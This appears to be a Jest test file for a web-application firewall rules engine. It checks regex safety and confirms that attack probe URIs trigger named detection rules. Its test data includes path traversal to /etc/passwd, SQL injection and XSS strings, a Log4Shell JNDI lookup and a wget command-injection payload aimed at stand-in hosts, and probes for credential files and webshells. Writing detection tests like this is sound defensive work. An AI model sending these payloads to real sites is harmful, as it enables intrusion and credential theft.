import { UnsafeRegexError, assertStaticallySafe, compileSafeRegex } from '../../src/rules/regex-safety';
import { makeHarness, NORMAL_PATHS, Harness } from '../helpers';

describe('Protección anti-ReDoS', () => {
  it.each([
    ['(a+)+$'],
    ['(.*)*x'],
    ['(\\w+\\s?)+$'],
    ['(a|aa)+$'],
    ['(?:x|y)*z'],
    ['(a)\\1'],
    ['a{1,}(b+){2,}'],
    ['x'.repeat(700)],
  ])('rechaza %s', (p) => {
    expect(() => compileSafeRegex(p, 'i')).toThrow(UnsafeRegexError);
  });

  it.each([['^/\\.env$'], ['(?:^|/)\\.git(?:/|$)'], ['union[\\s+/*]{1,30}select'], ['^(?!/wp-admin/).*\\.sql$'], ['(?:[\\w-]+/)?wp-login\\.php']])(
    'acepta %s',
    (p) => {
      expect(() => assertStaticallySafe(p)).not.toThrow();
      expect(compileSafeRegex(p, 'i')).toBeInstanceOf(RegExp);
    },
  );

  it('rechaza flags distintos de "i"', () => {
    expect(() => compileSafeRegex('abc', 'g')).toThrow(UnsafeRegexError);
    expect(() => compileSafeRegex('abc', 's')).toThrow(UnsafeRegexError);
  });
});

describe('Motor de reglas (config/rules.yaml real)', () => {
  let h: Harness;
  beforeAll(async () => {
    h = await makeHarness();
  });

  it('todas las reglas y bots del repo compilan de forma segura', () => {
    expect(h.rules.info().globalRules).toBeGreaterThan(30);
  });

  it.each(NORMAL_PATHS)('tráfico legítimo NO dispara reglas: %s', (uri) => {
    const b = h.req({ ip: '198.51.100.10', uri, method: uri.includes('admin-ajax') ? 'POST' : 'GET' });
    const ev = h.rules.evaluate(b.ctx, 'decision');
    expect(ev.matches.map((m) => m.id)).toEqual([]);
  });

  it.each([
    ['/.env', 'env-scan'],
    ['/.env.production', 'env-scan'],
    ['/.git/config', 'git-scan'],
    ['/.aws/credentials', 'dotfile-credentials'],
    ['/wp-config.php.bak', 'wp-config-backup'],
    ['/wp-config.php', 'wp-config-probe'],
    ['/backup.sql', 'db-dump-scan'],
    ['/database.sql.gz', 'db-dump-scan'],
    ['/config.php', 'config-file-probe'],
    ['/phpinfo.php', 'phpinfo-probe'],
    ['/info.php', 'phpinfo-probe'],
    ['/adminer.php', 'dbadmin-probe'],
    ['/phpmyadmin/index.php', 'dbadmin-probe'],
    ['/shell.php', 'webshell-scan'],
    ['/wso.php', 'webshell-scan'],
    ['/c99.php', 'webshell-scan'],
    ['/wp-content/uploads/2024/01/x.php', 'uploads-php-exec'],
    ['/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'phpunit-rce'],
    ['/wp-admin/install.php', 'wp-install-probe'],
    ['/site1/wp-admin/setup-config.php', 'wp-install-probe'],
    ['/wp-json/wp/v2/users', 'wp-user-enum-rest'],
    ['/wp-json/wp/v2/users/1', 'wp-user-enum-rest'],
    ['/wp-json/wp/v2/users?per_page=100&page=2', 'wp-user-enum-rest'],
    ['/?rest_route=/wp/v2/users', 'wp-user-enum-rest'],
    ['/?rest_route=%2Fwp%2Fv2%2Fusers%2F1', 'wp-user-enum-rest'],
    ['/xmlrpc.php', 'xmlrpc-disabled'],
    ['/_ignition/execute-solution', 'exploit-paths'],
    ['/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', 'wp-known-plugin-exploits'],
    ['/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php', 'wp-known-ajax-exploits'],
    ['/index.php?page=../../../../etc/passwd', 'traversal-targets'],
    ['/?id=1%20UNION%20ALL%20SELECT%201,2,3', 'sqli-union'],
    ["/?id=1'+or+'1'='1", 'sqli-tautology'],
    ['/?id=sleep(5)', 'sqli-functions'],
    ['/?q=%3Cscript%3Ealert(1)%3C/script%3E', 'xss-probe'],
    ['/?x=${jndi:ldap://evil/a}', 'rce-log4shell'],
    ['/?cmd=;wget%20http://x/y.sh', 'rce-command-injection'],
    ['/?f=php://input', 'php-wrappers'],
    ['/?%ADd+allow_url_include%3d1', 'rce-php-functions'],
  ])('detecta %s → %s', (uri, id) => {
    const b = h.req({ ip: '198.51.100.20', uri });
    const ids = h.rules.evaluate(b.ctx, 'decision').matches.map((m) => m.id);
    expect(ids).toContain(id);
  });

  it('detecta User-Agent de scanner', () => {
    const b = h.req({ ip: '198.51.100.21', uri: '/', userAgent: 'sqlmap/1.7.2#stable (https://sqlmap.org)' });
    expect(h.rules.evaluate(b.ctx, 'decision').matches.map((m) => m.id)).toContain('scanner-ua');
  });

  it('las rutas ACME nunca puntúan (regla allow)', () => {
    const b = h.req({ ip: '198.51.100.22', uri: '/.well-known/acme-challenge/../../.env' });
    // La ruta normalizada es /.env → sí debe puntuar (el allow no protege traversal)
    expect(h.rules.evaluate(b.ctx, 'decision').matches.length).toBeGreaterThan(0);
    const ok = h.req({ ip: '198.51.100.22', uri: '/.well-known/acme-challenge/token123' });
    const ev = h.rules.evaluate(ok.ctx, 'decision');
    expect(ev.allowedBy?.id).toBe('allow-well-known');
  });

  it('regla por sitio: overrides y disabled', async () => {
    h.config.sites.sites[0]!.rules.disabled = ['xmlrpc-disabled'];
    h.config.sites.sites[0]!.rules.overrides['env-scan'] = { score: 99 };
    h.rules.compile();
    const b = h.req({ ip: '198.51.100.23', uri: '/xmlrpc.php' });
    expect(h.rules.evaluate(b.ctx, 'decision').matches.map((m) => m.id)).not.toContain('xmlrpc-disabled');
    const e = h.req({ ip: '198.51.100.23', uri: '/.env' });
    expect(h.rules.evaluate(e.ctx, 'decision').matches.find((m) => m.id === 'env-scan')?.score).toBe(99);
    // host desconocido usa reglas globales
    const g = h.req({ ip: '198.51.100.23', uri: '/xmlrpc.php', host: 'otro-sitio.test' });
    expect(g.ctx.site).toBe('_unknown');
    expect(h.rules.evaluate(g.ctx, 'decision').matches.map((m) => m.id)).toContain('xmlrpc-disabled');
    // restaurar
    h.config.sites.sites[0]!.rules.disabled = [];
    delete h.config.sites.sites[0]!.rules.overrides['env-scan'];
    h.rules.compile();
  });
});
